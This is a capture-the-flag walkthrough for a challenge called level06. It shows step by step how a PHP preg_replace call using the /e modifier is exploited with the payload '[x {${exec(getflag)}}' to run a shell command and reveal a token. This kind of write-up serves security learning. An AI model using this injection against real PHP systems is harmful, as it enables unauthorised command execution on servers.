
#we got a php file and an executable
#the executable execute the php
#so now what the php does?
echo "test" > /tmp/file_cmd
./level06 /tmp/file_cmd
> test
#it use preg_replace, preg_replace has a known vulnerability with /e who execute the replace
#so we need to have a regex expression who will be execute by the preg_replace
#a regex of the form "[x expr]"
#we tried [x getflag] but it just shows getflag
echo "[x exec(getflag)]" > /tmp/file_cmd
./level06 /tmp/file_cmd
> exec(getflag)

#we need to execute getflag in the echo of php
#for this we will use complex expression ${}
echo '[x {${exec(getflag)}}' > /tmp/file_cmd
./level06 /tmp/file_cmd

#what this command does ? {$exec(getflag)} will get the result of the command exec(getflag)
# {result} will put the result in string format for the echo of php who will print it for us :

PHP Notice: Use of undefined constant getflag ...
#error because getflag is not a defined variable in the php program, we don't care, we just want that
#the program execute it when it is in the preg_replace
PHP Notice: Undefined variable: Check flag. Here is your token : ****
PHP Notice: Use of undefined constant getflag ...
#other error with the preg_replace
